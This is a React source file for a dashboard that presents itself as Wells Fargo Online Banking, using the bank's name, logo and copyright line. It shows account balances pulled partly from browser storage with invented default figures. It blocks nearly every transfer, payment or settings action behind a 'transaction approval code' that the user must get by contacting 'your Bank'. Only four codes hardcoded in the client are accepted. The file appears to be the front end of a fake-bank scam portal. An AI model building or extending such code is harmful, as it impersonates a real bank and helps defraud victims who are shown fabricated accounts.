import React, { useState, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { useAuth } from '../../Context/AuthContext';
import api from '../../utils/apiClient';
import './Dashboard.css';

// Modified Security Verification Modal Component
const SecurityVerificationModal = ({ isOpen, onClose, onVerify, targetPath }) => {
  const [verificationCode, setVerificationCode] = useState('');
  const [error, setError] = useState('');

  // Valid verification codes
  const validCodes = ['WELLS1608!', 'WELLS0923!', 'WELLS1608!', 'WELLS0816!'];

  // Reset form when modal opens/closes
  useEffect(() => {
    setVerificationCode('');
    setError('');
  }, [isOpen]);

  const handleSubmit = (e) => {
    e.preventDefault();
    
    // Basic validation
    if (!verificationCode.trim()) {
      setError('Please enter a verification code');
      return;
    }
    
    // Check if code is one of the valid codes
    if (!validCodes.includes(verificationCode)) {
      setError('Invalid code. Please enter a valid verification code.');
      return;
    }
    
    // Valid code provided
    onVerify(targetPath);
  };

  if (!isOpen) return null;

  return (
    <div className="dash002 security-modal-overlay">
      <div className="dash002 security-modal">
        <div className="dash002 security-modal-header">
          <h3>Verification Required</h3>
          <button className="dash002 close-modal" onClick={onClose}>&times;</button>
        </div>
        <div className="dash002 security-modal-body">
          <p>To complete this operation, please contact your Bank to obtain your transaction approval code.</p>
          
          <form onSubmit={handleSubmit}>
            <div className="dash002 form-group">
              <label htmlFor="transaction-code">Transaction Approval Code</label>
              <input
                type="text"
                id="transaction-code"
                value={verificationCode}
                onChange={(e) => setVerificationCode(e.target.value)}
                className="dash002 verification-input"
                placeholder="Enter your code"
              />
              {error && <p className="dash002 error-text">{error}</p>}
            </div>
            
            <div className="dash002 modal-actions">
              <button type="button" className="dash002 cancel-btn" onClick={onClose}>Cancel</button>
              <button type="submit" className="dash002 verify-btn">Verify</button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};

// Utility Function for Formatting Currency
const formatCurrency = (amount) => {
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD'
  }).format(amount);
};

// User Profile Component
const UserProfile = ({ user }) => {
  return (
    <div className="dash002 user-profile">
      {user.profilePicture ? (
        <img src={user.profilePicture} alt="Profile" className="dash002 profile-picture" />
      ) : (
        <div className="dash002 placeholder-profile">
          {user.firstName && user.lastName ? 
            `${user.firstName[0]}${user.lastName[0]}` : 'WF'}
        </div>
      )}
      <div className="dash002 user-details">
        <p>{user.firstName || ''} {user.lastName || ''}</p>
        <p>{user.email || ''}</p>
        {user.address && typeof user.address === 'object' ? (
          <p>
            {user.address.line1 || ''} {user.address.line2 ? user.address.line2 : ''}
            {user.address.city && user.address.state ? `, ${user.address.city}, ${user.address.state} ${user.address.zipCode || ''}` : ''}
          </p>
        ) : (
          user.address && typeof user.address === 'string' && <p>{user.address}</p>
        )}
      </div>
    </div>
  );
};

// Account Type Icons Component
const AccountTypeIcon = ({ type }) => {
  // Map account types to their icons
  const iconMap = {
    'checking': '💳',
    'savings': '💰',
    'credit': '💲',
    'retirement': '🏦',
    'investment': '📈',
    'certificate of deposit': '🔒',
    'money market': '💵',
    'student': '🎓',
    'loan': '🏠',
    'mortgage': '🏘️',
  };

  // Determine the icon to use based on account type
  const getIconKey = (accountType) => {
    const lowerType = accountType.toLowerCase();
    for (const key in iconMap) {
      if (lowerType.includes(key)) {
        return key;
      }
    }
    return 'checking'; // default
  };

  const iconKey = getIconKey(type);
  
  return (
    <div className={`dash002 account-icon ${iconKey}-icon`}>
      {iconMap[iconKey]}
    </div>
  );
};

// Main Dashboard Component
const Dashboard = () => {
  const navigate = useNavigate();
  const { currentUser, isAuthenticated } = useAuth();
  
  const [accounts, setAccounts] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);
  
  // State for security verification modal
  const [securityModalOpen, setSecurityModalOpen] = useState(false);
  const [pendingPath, setPendingPath] = useState(null);
  
  // Check if this user is newly registered (has no accounts)
  const isNewUser = accounts.length === 0;

  // Create welcome message for new users
  const welcomeMessage = isNewUser && currentUser
    ? `Welcome to Wells Fargo Online Banking, ${currentUser.firstName || ''}! You currently have no accounts. Get started by opening your first account below.`
    : '';

  // Fetch dashboard data from the API
  useEffect(() => {
    const fetchDashboardData = async () => {
      if (!isAuthenticated()) {
        navigate('/login');
        return;
      }
  
      try {
        setLoading(true);
        
        // Get the auth token
        const token = localStorage.getItem('wellsFargoAuthToken');
        if (!token) {
          throw new Error('Authentication token not found');
        }
  
        // Create API client with auth header
        // const API_URL = import.meta.env?.VITE_API_URL || 'https://wellsapi.onrender.com';
        // const api = axios.create({
        //   baseURL: API_URL,
        //   headers: {
        //     'Content-Type': 'application/json',
        //     'Authorization': `Bearer ${token}`
        //   }
        // });
  
        // First, get any existing accounts from localStorage
        const storedAccounts = localStorage.getItem('wellsFargoAccounts');
        let existingAccounts = [];
        
        if (storedAccounts) {
          try {
            existingAccounts = JSON.parse(storedAccounts);
            console.log('Retrieved existing accounts from storage:', existingAccounts);
          } catch (parseError) {
            console.error('Error parsing existing accounts data:', parseError);
          }
        }
        
        // Check for new account in localStorage
        const newAccountFromStorage = localStorage.getItem('newWellsFargoAccount');
        let newAccount = null;
        
        if (newAccountFromStorage) {
          try {
            newAccount = JSON.parse(newAccountFromStorage);
            console.log('Retrieved new account from storage:', newAccount);
          } catch (parseError) {
            console.error('Error parsing new account data:', parseError);
          }
        }
  
        // Fetch dashboard data
        // const response = await api.get('/dashboard');
        const response = await api.get('/dashboard');
        
        if (response.data.success) {
          // Process accounts from API response
          const apiAccounts = response.data.data.accounts || [];
          let combinedAccounts = [...apiAccounts];
          
          // Add existing accounts if they're not already in the API accounts
          if (existingAccounts.length > 0) {
            existingAccounts.forEach(existingAcc => {
              const accountExists = combinedAccounts.some(acc => 
                acc.id === existingAcc.id || 
                acc._id === existingAcc._id || 
                acc.accountNumber === existingAcc.accountNumber
              );
              
              if (!accountExists) {
                combinedAccounts.push(existingAcc);
              }
            });
          }
          
          // Add the new account if it exists and isn't already included
          if (newAccount) {
            // Check if new account already exists in combined accounts
            const accountExists = combinedAccounts.some(acc => 
              acc.id === newAccount.id || 
              acc._id === newAccount._id || 
              acc.accountNumber === newAccount.accountNumber
            );
            
            if (!accountExists) {
              // Process account to ensure it has the correct format
              const processedAccount = {
                ...newAccount,
                id: newAccount.id || newAccount._id || `acc-${Date.now()}`,
                type: newAccount.type || newAccount.accountType,
                balance: parseFloat(newAccount.balance || newAccount.initialDeposit || 0),
                accountNumber: newAccount.accountNumber || `${Math.floor(1000000000 + Math.random() * 9000000000)}`
              };
              
              // Add specific properties based on account type
              if (processedAccount.type && processedAccount.type.toLowerCase().includes('credit')) {
                processedAccount.creditLimit = processedAccount.creditLimit || 5000;
              }
              
              combinedAccounts.push(processedAccount);
            }
          }
          
          // Store the combined accounts in localStorage for future reference
          localStorage.setItem('wellsFargoAccounts', JSON.stringify(combinedAccounts));
          
          setAccounts(combinedAccounts);
          
          // Update user data in local storage if needed
          if (response.data.data.user) {
            const updatedUserData = {
              ...currentUser,
              ...response.data.data.user
            };
            localStorage.setItem('wellsFargoUser', JSON.stringify(updatedUserData));
          }
        } else {
          throw new Error(response.data.error || 'Failed to fetch dashboard data');
        }
      } catch (err) {
        console.error('Dashboard data fetch error:', err);
        setError(err.message || 'Failed to load dashboard data');
        
        // Fallback for development without backend
        if (process.env.NODE_ENV === 'development') {
          // Load all accounts from localStorage
          const storedAccounts = localStorage.getItem('wellsFargoAccounts');
          if (storedAccounts) {
            try {
              const existingAccounts = JSON.parse(storedAccounts);
              setAccounts(existingAccounts);
              console.log('Loaded accounts from localStorage fallback:', existingAccounts);
            } catch (parseError) {
              console.error('Error parsing accounts from localStorage:', parseError);
            }
          } else {
            // Try to get account from newWellsFargoAccount as a last resort
            const newAccountFromStorage = localStorage.getItem('newWellsFargoAccount');
            if (newAccountFromStorage) {
              try {
                const newAccount = JSON.parse(newAccountFromStorage);
                console.log('Fallback: Retrieved new account from storage:', newAccount);
                
                // Prepare the account with consistent properties
                const processedAccount = {
                  ...newAccount,
                  id: newAccount.id || newAccount._id || `acc-${Date.now()}`,
                  type: newAccount.type || newAccount.accountType,
                  balance: parseFloat(newAccount.balance || newAccount.initialDeposit || 0),
                  accountNumber: newAccount.accountNumber || `${Math.floor(1000000000 + Math.random() * 9000000000)}`
                };
                
                if (processedAccount.type && processedAccount.type.toLowerCase().includes('credit')) {
                  processedAccount.creditLimit = processedAccount.creditLimit || 5000;
                }
                
                const accountsList = [processedAccount];
                
                // Store in localStorage for future reference
                localStorage.setItem('wellsFargoAccounts', JSON.stringify(accountsList));
                
                setAccounts(accountsList);
              } catch (parseError) {
                console.error('Error parsing new account data:', parseError);
              }
            }
          }
        }
      } finally {
        setLoading(false);
      }
    };
  
    fetchDashboardData();
  }, [navigate, isAuthenticated, currentUser]);

  // Handler for navigation that requires verification
  const handleSecureNavigation = (path) => {
    setPendingPath(path);
    setSecurityModalOpen(true);
  };

  // Verification successful handler
  const handleVerificationSuccess = (path) => {
    setSecurityModalOpen(false);
    navigate(path);
  };

  // Enhanced function to navigate to the appropriate account page based on account type
  const navigateToAccountPage = (account) => {
    // Map each account type to its simplified route name
    let routeType;
    
    // Convert the account type to lowercase for comparison
    const accountTypeLower = (account.type || account.accountType || "").toLowerCase();
    
    if (accountTypeLower.includes('checking')) {
      routeType = 'checking';
    } else if (accountTypeLower.includes('savings')) {
      routeType = 'savings';
    } else if (accountTypeLower.includes('credit')) {
      routeType = 'credit';
    } else if (accountTypeLower.includes('retirement')) {
      routeType = 'retirement-account';
    } else if (accountTypeLower.includes('investment')) {
      routeType = 'investment';
    } else if (accountTypeLower.includes('loan') || accountTypeLower.includes('mortgage')) {
      routeType = 'loan';
    } else if (accountTypeLower.includes('student')) {
      routeType = 'student';
    } else if (accountTypeLower.includes('certificate of deposit') || accountTypeLower.includes('cd')) {
      routeType = 'cd';
    } else if (accountTypeLower.includes('money market')) {
      routeType = 'money-market';
    } else {
      // Fallback to a generic route using account type
      routeType = accountTypeLower.replace(/\s+/g, '-');
    }
    
    // Use direct navigation for account details without security verification
    const path = `/accounts/${routeType}/${account.id}`;
    navigate(path);
  };

  // Function to generate appropriate account action buttons based on account type
  const renderAccountActions = (account) => {
    const actions = [];
    
    // Common actions for most accounts
    actions.push(
      <button 
        key="details" 
        className="dash002 details-btn" 
        onClick={(e) => {
          e.stopPropagation();
          navigateToAccountPage(account);
        }}
      >
        Details
      </button>
    );

    // Add payment button for credit/loan/mortgage accounts
    if (account.type.toLowerCase().includes('credit') || 
        account.type.toLowerCase().includes('loan') || 
        account.type.toLowerCase().includes('mortgage')) {
      actions.push(
        <button 
          key="payment" 
          className="dash002 payment-btn" 
          onClick={(e) => {
            e.stopPropagation();
            handleSecureNavigation('/payment');
          }}
        >
          Make Payment
        </button>
      );
    }

    return actions;
  };

  // Render accounts section based on user status
  const renderAccountsSection = () => {
    if (loading) {
      return <div className="dash002 loading">Loading your accounts...</div>;
    }
    
    if (error) {
      return <div className="dash002 error-message">{error}</div>;
    }
    
    if (isNewUser) {
      return (
        <section className="dash002 accounts-overview dash002 new-user-welcome">
          <h2>Welcome to Wells Fargo</h2>
          <p className="dash002 welcome-message">{welcomeMessage}</p>
          <div className="dash002 new-user-actions">
            <h3>Get Started</h3>
            <button 
              className="dash002 primary-action-btn" 
              onClick={() => handleSecureNavigation('/open-new-account')}
            >
              Open Your First Account
            </button>
          </div>
        </section>
      );
    }
    
    
    return (
      <section className="dash002 accounts-overview">
        <h2>My Accounts</h2>
        {accounts.length > 0 ? (
          <div className="dash002 account-grid">
            {accounts.map(account => (
              <div 
                key={account.id} 
                className="dash002 account-card"
                data-type={account.type.toLowerCase().replace(/\s+/g, '-')} 
                onClick={() => navigateToAccountPage(account)}
              >
                <div className="dash002 account-card-header">
                  <AccountTypeIcon type={account.type} />
                  <h3>{account.type}</h3>
                  <span className="dash002 account-type-badge">{account.type}</span>
                </div>
                
                <div className="dash002 account-card-content">
                  <p className="dash002 account-number">{account.accountNumber}</p>
                  
                  <div className="dash002 account-balance-container">
                    <p className="dash002 account-balance-label">
                      {account.type.toLowerCase().includes('credit') ? 'Available Credit' : 'Current Balance'}
                    </p>
                    <p className="dash002 account-balance">
                      {account.type.toLowerCase().includes('credit') 
                        ? formatCurrency(account.creditLimit + account.balance)
                        : formatCurrency(account.balance)}
                    </p>
                    
                    {/* Credit account specific UI */}
                    {account.type.toLowerCase().includes('credit') && (
                      <>
                        <div className="dash002 credit-limit-progress">
                          <div 
                            className="dash002 credit-limit-bar" 
                            style={{ width: `${Math.max(0, (account.balance/account.creditLimit) * 100)}%` }}
                          ></div>
                        </div>
                        <div className="dash002 credit-details">
                          <span>Credit Used: {formatCurrency(Math.abs(account.balance))}</span>
                          <span>Limit: {formatCurrency(account.creditLimit)}</span>
                        </div>
                      </>
                    )}
                    
                    {/* Student account specific UI */}
                    {account.type.toLowerCase().includes('student') && (
                      <div className="dash002 student-details">
                        <span>No Monthly Fee</span>
                        <span>Student Benefits Active</span>
                      </div>
                    )}
                    
                    {/* Investment/Retirement account specific UI */}
                    {(account.type.toLowerCase().includes('investment') || 
                      account.type.toLowerCase().includes('retirement')) && (
                      <div className="dash002 investment-details">
                        <span>YTD Return: {account.ytdReturn || '3.2%'}</span>
                        <span>Total Growth: {account.totalGrowth || '8.7%'}</span>
                      </div>
                    )}
                    
                    {/* CD account specific UI */}
                    {(account.type.toLowerCase().includes('certificate') || 
                      account.type.toLowerCase().includes('cd')) && (
                      <div className="dash002 cd-details">
                        <span>Term: {account.term || '12 months'}</span>
                        <span>Rate: {account.interestRate || '3.75%'}</span>
                        <span>Maturity: {account.maturityDate || '04/11/2026'}</span>
                      </div>
                    )}
                    
                    {/* Money Market account specific UI */}
                    {account.type.toLowerCase().includes('money market') && (
                      <div className="dash002 money-market-details">
                        <span>Current APY: {account.apy || '2.45%'}</span>
                        <span>Checks Available: {account.checksAvailable || 'Yes'}</span>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="dash002 account-card-footer">
                  {renderAccountActions(account)}
                </div>
              </div>
            ))}
          </div>
        ) : (
          <p>You have no active accounts. Open your first account to get started.</p>
        )}
      </section>
    );
  };

  // Render account type selection for new accounts
  const renderAllAccountTypes = () => {
    const accountTypes = [
      {
        type: 'Checking Account',
        description: 'Everyday banking with easy access to your money',
        icon: '💳',
        path: '/open-new-account/checking'
      },
      {
        type: 'Savings Account',
        description: 'Build your savings with competitive interest rates',
        icon: '💰',
        path: '/open-new-account/savings'
      },
      {
        type: 'Credit Account',
        description: 'Flexible spending with rewards on every purchase',
        icon: '💲',
        path: '/open-new-account/credit'
      },
      {
        type: 'Retirement Account',
        description: 'Save for your future with tax advantages',
        icon: '🏦',
        path: '/open-new-account/retirement'
      },
      {
        type: 'Investment Account',
        description: 'Grow your wealth through market investments',
        icon: '📈',
        path: '/open-new-account/investment'
      },
      {
        type: 'Certificate of Deposit',
        description: 'Guaranteed returns with fixed interest rates',
        icon: '🔒',
        path: '/open-new-account/cd'
      },
      {
        type: 'Money Market Account',
        description: 'Competitive rates with check-writing privileges',
        icon: '💵',
        path: '/open-new-account/money-market'
      },
      {
        type: 'Student Account',
        description: 'Designed for students with special benefits',
        icon: '🎓',
        path: '/open-new-account/student'
      }
    ];

    return (
      <div className="dash002 new-account-types">
        <h3>Account Types</h3>
        <div className="dash002 account-type-grid">
          {accountTypes.map((type, index) => (
            <div 
              key={index} 
              className="dash002 account-type-card"
              onClick={() => handleSecureNavigation(type.path)}
            >
              <div className="dash002 account-type-icon">
                {type.icon}
              </div>
              <h4>{type.type}</h4>
              <p>{type.description}</p>
            </div>
          ))}
        </div>
      </div>
    );
  };

  return (
    <div className="dash002 dashboard-container">
      <header className="dash002 dashboard-header">
        <div className="dash002 header-content">
          <img 
            src="/Images/wells fargo.jpeg" 
            alt="Wells Fargo Logo" 
            className="dash002 logo" 
            onClick={() => navigate('/dashboard')}
            style={{ cursor: 'pointer' }}
          />
          <UserProfile user={currentUser || {}} />
        </div>
        <nav className="dash002 main-navigation">
          {/* Modified navigation links to trigger security modal */}
          <a href="#" onClick={(e) => { e.preventDefault(); handleSecureNavigation('/accounts'); }}>Accounts</a>
          <a href="#" onClick={(e) => { e.preventDefault(); handleSecureNavigation('/transfer-money'); }}>Transfers</a>
          <a href="#" onClick={(e) => { e.preventDefault(); handleSecureNavigation('/pay-bills'); }}>Payments</a>
          <a href="#" onClick={(e) => { e.preventDefault(); handleSecureNavigation('/investments'); }}>Investments</a>
          <a href="#" onClick={(e) => { e.preventDefault(); handleSecureNavigation('/student-center'); }}>Student Center</a>
        </nav>
      </header>

      <main className="dash002 dashboard-content">
        {renderAccountsSection()}

        <section className="dash002 quick-actions">
          <h2>Quick Actions</h2>
          <div className="dash002 action-buttons">
            <button 
              className="dash002 action-btn dash002 add-account" 
              onClick={() => handleSecureNavigation('/open-new-account')}
              disabled={false}
            >
              <div className="dash002 action-btn-icon">➕</div>
              <div className="dash002 action-btn-content">
                <p className="dash002 action-btn-title">
                  {isNewUser ? 'Open Your First Account' : 'Open New Account'}
                </p>
                <p className="dash002 action-btn-description">
                  Create a new Wells Fargo account
                </p>
              </div>
            </button>
            
            <button 
              className="dash002 action-btn dash002 transfer" 
              onClick={() => handleSecureNavigation('/transfer-money')}
              disabled={isNewUser}
            >
              <div className="dash002 action-btn-icon">↔️</div>
              <div className="dash002 action-btn-content">
                <p className="dash002 action-btn-title">Transfer Money</p>
                <p className="dash002 action-btn-description">
                  Move funds between your accounts
                </p>
              </div>
            </button>
            
            <button 
              className="dash002 action-btn dash002 pay-bill" 
              onClick={() => handleSecureNavigation('/pay-bills')}
              disabled={isNewUser}
            >
              <div className="dash002 action-btn-icon">💵</div>
              <div className="dash002 action-btn-content">
                <p className="dash002 action-btn-title">Pay Bills</p>
                <p className="dash002 action-btn-description">
                  Pay your bills and manage payees
                </p>
              </div>
            </button>
            
            <button 
              className="dash002 action-btn dash002 deposit" 
              onClick={() => handleSecureNavigation('/deposit-check')}
              disabled={isNewUser}
            >
              <div className="dash002 action-btn-icon">📱</div>
              <div className="dash002 action-btn-content">
                <p className="dash002 action-btn-title">Deposit Check</p>
                <p className="dash002 action-btn-description">
                  Deposit checks with your mobile device
                </p>
              </div>
            </button>
            
            <button 
              className="dash002 action-btn dash002 student-services" 
              onClick={() => handleSecureNavigation('/student-center')}
              disabled={isNewUser}
            >
              <div className="dash002 action-btn-icon">🎓</div>
              <div className="dash002 action-btn-content">
                <p className="dash002 action-btn-title">Student Services</p>
                <p className="dash002 action-btn-description">
                  Access student-specific banking tools
                </p>
              </div>
            </button>
          </div>
        </section>

        {/* Account Management with secure navigation */}
        <section className="dash002 account-management">
          <h2>Account Management</h2>
          <div className="dash002 management-options">
            <div className="dash002 management-option" onClick={() => handleSecureNavigation('/account-settings')}>
              <div className="dash002 option-icon">⚙️</div>
              <div className="dash002 option-content">
                <h3>Account Settings</h3>
                <p>Update your personal information and preferences</p>
              </div>
            </div>
            
            <div className="dash002 management-option" onClick={() => handleSecureNavigation('/statements')}>
              <div className="dash002 option-icon">📄</div>
              <div className="dash002 option-content">
                <h3>Statements & Documents</h3>
                <p>View and download your account statements</p>
              </div>
            </div>
            
            <div className="dash002 management-option" onClick={() => handleSecureNavigation('/alerts')}>
              <div className="dash002 option-icon">🔔</div>
              <div className="dash002 option-content">
                <h3>Alerts & Notifications</h3>
                <p>Manage your account alerts and notifications</p>
              </div>
            </div>
            
            <div className="dash002 management-option" onClick={() => handleSecureNavigation('/security')}>
              <div className="dash002 option-icon">🔒</div>
              <div className="dash002 option-content">
                <h3>Security Center</h3>
                <p>Update security settings and monitor account activity</p>
              </div>
            </div>
          </div>
        </section>
      </main>

      <footer className="dash002 dashboard-footer">
        <p>© {new Date().getFullYear()} Wells Fargo Bank, N.A. All rights reserved.</p>
        <div className="dash002 footer-links">
          <button type="button" className="dash002 link-button">Privacy</button>
          <button type="button" className="dash002 link-button">Security</button>
          <button type="button" className="dash002 link-button">Terms</button>
          <button type="button" className="dash002 link-button">Help</button>
        </div>
      </footer>

      {/* Security verification modal */}
      <SecurityVerificationModal
        isOpen={securityModalOpen}
        onClose={() => setSecurityModalOpen(false)}
        onVerify={handleVerificationSuccess}
        targetPath={pendingPath}
      />
    </div>
  );
};

export default Dashboard;